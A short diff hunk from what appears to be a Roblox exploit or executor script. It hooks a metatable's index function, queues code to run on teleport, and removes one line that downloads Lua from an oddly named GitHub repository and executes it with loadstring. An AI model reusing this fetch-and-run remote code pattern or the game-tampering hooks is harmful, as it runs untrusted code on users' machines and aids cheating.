@@ -70,8 +70,6 @@ queue_on_teleport([=[
                     return oldIndex(tbl, idx)
                 end))
 
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/d4e6f8a0b2c4d6e8f0a2c4e6f8a0b2c4d6/cloudflare-global/refs/heads/main/rejoiner.lua"))()
-
             elseif game.PlaceId == 13643807539 then
                 repeat task.wait() until not game.ReplicatedFirst:FindFirstChild("Intro")
                 game:GetService("ScriptContext"):SetTimeout(9e9)
